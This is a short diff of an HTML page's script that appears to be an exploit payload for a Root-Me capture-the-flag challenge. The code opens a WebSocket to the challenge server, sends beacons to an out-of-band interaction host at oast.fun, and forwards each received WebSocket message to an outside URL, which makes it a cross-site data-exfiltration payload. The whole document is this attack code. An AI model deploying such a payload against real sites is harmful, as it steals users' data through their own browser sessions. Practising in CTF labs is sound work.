@@ -5,13 +5,22 @@
 </head>
 <body>
 <script>
-      //fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/ok1');
-      fetch('http://ctf29.root-me.org/room');
-    setTimeout(() => {
-        var ws = new WebSocket('ws://ctf29.root-me.org/ws');
+    function beacon(msg) {
+        fetch("https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/" + encodeURIComponent(msg), {
+          mode: "no-cors"
+        });
+    }
+    beacon("script_start");    
+    
+          var ws;
+          try {
+            ws = new WebSocket("ws://ctf29.root-me.org/ws");
+                beacon("ws_object_created");
+              } catch (e) {
+                beacon("ws_constructor_error");
+          }
 
         ws.onopen = function() {
-            fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/hellox');
             ws.send("hello");
         };
 
@@ -22,7 +31,6 @@
                 body: event.data
             });
         };
-    },3000);
 </script>
 
 </body> 
